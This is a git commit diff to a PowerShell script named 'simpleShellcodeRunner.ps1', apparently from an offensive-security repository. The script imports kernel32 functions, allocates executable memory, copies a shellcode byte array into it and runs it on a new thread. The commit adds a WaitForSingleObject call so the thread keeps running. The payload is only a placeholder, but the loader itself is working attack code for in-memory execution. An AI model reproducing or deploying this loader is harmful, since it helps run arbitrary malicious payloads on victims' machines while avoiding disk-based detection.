6aa15cca34130fe199db831fc2e4f7b83ba6505f
Matheus Alexandre <60984217+Xcatolin@users.noreply.github.com>
2022-08-28 10:03:09 -0300

    Update simpleShellcodeRunner.ps1

--- PowerShell/simpleShellcodeRunner.ps1
+++ PowerShell/simpleShellcodeRunner.ps1
@@ -7,14 +7,17 @@ public class k32{
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32", CharSet=CharSet.Ansi)]
     public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32")]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 }
 "@
 
 Add-Type $k32
 
-[Byte[]] $buf = <generated_shellcode>
+[Byte[]] $buf = <generated_ps1_shellcode>
 
 $size = $buf.Length
 [IntPtr]$addr = [k32]::VirtualAlloc(0,$size,0x3000,0x40);
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
 $thandle=[k32]::CreateThread(0,0,$addr,0,0,0);
+[k32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
